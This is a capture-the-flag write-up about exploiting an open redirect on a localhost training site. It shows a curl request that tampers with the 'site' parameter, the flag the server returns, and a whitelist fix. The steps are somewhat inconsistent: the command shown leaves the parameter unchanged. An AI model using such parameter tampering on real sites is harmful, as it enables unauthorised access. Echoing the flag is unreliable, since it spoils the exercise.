# Breach Name: Open Redirect Vulnerability on Redirect Links
## Description of the Breach

This breach was identified by analyzing the redirect functionality available on the website. By manipulating the URL parameter in the redirection request, we were able to bypass the intended redirection and retrieve a hidden flag.

## Steps to Reproduce

1. Identify Redirect Buttons:
	- On the homepage, there are buttons that redirect to external websites (e.g., Twitter, Facebook).
	- Inspect these buttons and observe the network activity when clicking them to understand the redirection mechanism.

2. Capture the Redirect Request:
	- Use your browser's developer tools to open the "Network" tab.
	- Click on one of the redirect buttons and capture the HTTP request that is made. This request will look something like this:
	  ```bash
	  http://localhost:8080/index.php?page=redirect&site=twitter
	  ```

3. Copy the Request as cURL:
	- Right-click on the network request and select "Copy as cURL". This provides a cURL command that you can modify for further exploitation.

4. Manipulate the Redirection Site:
	- In the copied cURL command, modify the site parameter to see if you can trigger different behaviors or access hidden content:
	  ```bash
	  curl 'http://localhost:8080/index.php?page=redirect&site=twitter' \
	  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
	  -H 'Accept-Language: en-US,en' \
	  -H 'Connection: keep-alive' \
	  -H 'Cookie: csrftoken=6la8Whx71kgYwiu1HUqby8bGHiSkJf2j9rlT80LuniGLvkJzAtbJNOx4EK5rXVKe; sessionid=wkyan96hdzkvna3h6vfkck2lbsci7d30; I_am_admin=' \
	  -H 'Referer: http://localhost:8080/' \
	  -H 'Sec-Fetch-Dest: document' \
	  -H 'Sec-Fetch-Mode: navigate' \
	  -H 'Sec-Fetch-Site: same-origin' \
	  -H 'Sec-Fetch-User: ?1' \
	  -H 'Sec-GPC: 1' \
	  -H 'Upgrade-Insecure-Requests: 1' \
	  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
	  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"' \
	  -H 'sec-ch-ua-mobile: ?0' \
	  -H 'sec-ch-ua-platform: "Linux"'
	  ```
	  Explanation: This command requests the redirection to the site specified in the site parameter.

5. Execute the Modified cURL Command:
	- Run the modified cURL command in your terminal. The server processes the request and returns a response containing the flag:
	  ```html
	  <h2 style="margin-top:50px;">Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3</h2>
	  ```

6. Retrieve the Flag:
	- The flag is displayed in the server's response:
	  ```
	  b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
	  ```

## Explanation of the Breach

The vulnerability here is an Open Redirect flaw, where the application allows unvalidated input to control the redirection destination. By manipulating the site parameter in the redirect URL, we were able to access hidden content on the server, including the flag.

## How to Fix the Breach

- Use a Whitelist for Redirection:
	Maintain a whitelist of allowed redirect destinations. The application should only redirect to URLs explicitly included in this list.